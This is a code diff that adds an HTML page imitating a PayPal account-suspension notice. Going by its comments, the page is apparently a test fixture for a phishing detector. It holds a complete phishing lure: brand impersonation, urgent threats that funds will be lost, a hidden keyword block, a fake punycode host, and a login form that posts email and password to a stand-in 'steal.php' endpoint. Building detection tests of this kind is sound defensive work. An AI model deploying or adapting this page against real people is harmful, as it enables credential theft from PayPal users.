@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal - Account Suspended</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        .danger-box {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            border-top: 5px solid #dc3545;
+            max-width: 400px;
+        }
+
+        h1 {
+            color: #dc3545;
+        }
+
+        p {
+            font-size: 18px;
+            color: #333;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+        }
+
+        button {
+            background: #0070ba;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .hidden-trigger {
+            display: none;
+        }
+    </style>
+    <script>
+        // AUTO-SIMULATION: If no query param, reload with fake host to trigger PhishingShield
+        if (!window.location.search.includes('fake_host_for_testing')) {
+            // Using a PUNYCODE domain (xn--) + Brand Impersonation (paypal)
+            const newUrl = window.location.protocol + '//' + window.location.pathname + '?fake_host_for_testing=xn--paypal-bad.com';
+            window.location.replace(newUrl);
+        }
+    </script>
+</head>
+
+<body>
+
+    <div class="danger-box">
+        <h1>⚠️ Account Suspended</h1>
+        <p>Your <strong>PayPal</strong> account has been locked due to unauthorized access.</p>
+        <p style="color:red; font-weight:bold;">IMMEDIATE ACTION REQUIRED</p>
+        <p>You must verify your identity within 24 hours or your funds will be lost.</p>
+
+        <form action="http://insecure-site.com/steal.php" method="POST">
+            <input type="text" placeholder="Email Address">
+            <input type="password" placeholder="Enter Password to Verify">
+            <button type="submit">Verify Identity Now</button>
+        </form>
+    </div>
+
+    <!-- Hidden Keywords to assist Risk Engine -->
+    <div class="hidden-trigger">
+        urgent failure billing update unauthorized activity alert security
+    </div>
+
+</body>
+
+</html>
